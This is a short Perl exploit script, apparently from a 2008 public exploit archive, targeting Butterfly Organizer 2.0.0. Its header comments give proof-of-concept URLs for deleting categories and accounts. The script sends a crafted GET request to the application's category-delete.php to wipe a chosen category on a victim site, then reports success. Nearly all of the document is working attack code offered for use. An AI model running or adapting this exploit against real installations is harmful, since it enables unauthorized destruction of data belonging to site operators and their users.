#!/usr/bin/perl -w
# Butterfly Organizer 2.0.0 <=  Arbitrary Delete (Category/Account)
# poc for del Ctegory : http://localhost/organizer/category-delete.php?tablehere=[NAME OF CATEGORY]&is_js_confirmed=1
# poc for del Account : http://localhost/organizer//delete.php?id=[id of account]&mytable=[NAME OF CATEGORY]
########################################
#[*] Founded &  Exploited by : Stack
########################################
# SIMPLE EXPLOIT WITH PERL
system("color f");
print "\t\t############################################################\n\n";
print "\t\t#       Butterfly Organizer 2.0.0 <= Arbitrary Delete      #\n\n";
print "\t\t#                     ( Category / Account )               #\n\n";
print "\t\t#                           by Stack                       #\n\n";
print "\t\t############################################################\n\n";
########################################
#----------------------------------------------------------------------------#
########################################
use LWP::UserAgent;
die "Usage: perl $0 http://victim.com/path/\n" unless @ARGV;
print "\n[!] Category name : ";
chomp(my $cat=<STDIN>);
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$host = $ARGV[0] . "/category-delete.php?tablehere=".$cat."&is_js_confirmed=1";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content;
if ($answer =~ /$cat/)
{
        print "\n[+] Exploit failed \n";}else{
        print "\nBrought to you by v4-team.com...\n";
        print "\n[+] Category Deleted\n";}
 
########################################
#-------------------         Exploit exploited by Stack       --------------------#
########################################

# milw0rm.com [2008-06-13]
